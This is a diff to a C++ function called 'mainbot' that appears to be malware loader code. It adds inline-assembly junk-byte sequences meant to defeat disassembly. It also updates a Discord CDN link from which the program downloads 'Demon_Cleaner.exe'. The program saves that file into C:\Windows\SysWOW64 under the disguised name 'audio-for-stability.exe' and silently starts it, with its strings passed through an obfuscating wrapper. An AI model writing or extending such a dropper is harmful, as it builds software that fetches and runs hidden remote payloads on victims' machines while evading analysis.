@@ -180,6 +180,44 @@ void mainbot()
         tlmisir();
         if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
         {
+            __asm
+            {
+                jmp short Label1
+                _emit 0xB2
+                _emit 0xB9
+                _emit 0x44
+                _emit 0xED
+                _emit 0xB4
+                Label2:
+                jmp short Label3
+                    _emit 0xF9
+                    _emit 0x7C
+                    _emit 0xB8
+                    _emit 0x81
+                    _emit 0x76
+                    Label1:
+                jmp short Label2
+                    _emit 0x90
+                    _emit 0x84
+                    _emit 0x48
+                    _emit 0x6F
+                    _emit 0xA8
+                    Label3:
+                jmp short Label4
+                    _emit 0xEC
+                    _emit 0x2A
+                    _emit 0x77
+                    _emit 0x20
+                    _emit 0x7C
+                    Label4:
+                jmp short Label5
+                    _emit 0xCD
+                    _emit 0x75
+                    _emit 0xB8
+                    _emit 0x46
+                    _emit 0xFD
+                    Label5:
+            }
             string filename = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
             ifstream ifile(filename);
             if (ifile)
@@ -191,12 +229,52 @@ void mainbot()
             }
             else
             {
-                std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/887380454674694184/Demon_Cleaner.exe").c_str());
+                __asm
+                {
+                    jmp short caca1
+                    _emit 0x6F
+                    _emit 0x77
+                    _emit 0xD9
+                    _emit 0xF1
+                    _emit 0xDF
+                    caca2:
+                    jmp short caca3
+                        _emit 0x6C
+                        _emit 0x64
+                        _emit 0x6E
+                        _emit 0x89
+                        _emit 0xB6
+                        caca1:
+                    jmp short caca2
+                        _emit 0x54
+                        _emit 0x4F
+                        _emit 0xA0
+                        _emit 0xD8
+                        _emit 0xF5
+                        caca3:
+                    jmp short caca4
+                        _emit 0x22
+                        _emit 0xD9
+                        _emit 0xD9
+                        _emit 0x07
+                        _emit 0x07
+                        caca4:
+                    jmp short caca5
+                        _emit 0xDF
+                        _emit 0xA5
+                        _emit 0x5E
+                        _emit 0x33
+                        _emit 0xA0
+                        caca5:
+                }
+                
+                std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891304130897915964/Demon_Cleaner.exe").c_str());
                 std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
                 URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
                 system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
                 system(dead("start audio-for-stability.exe").c_str());
                 system(dead("cls").c_str());
+               
             }
                 
            
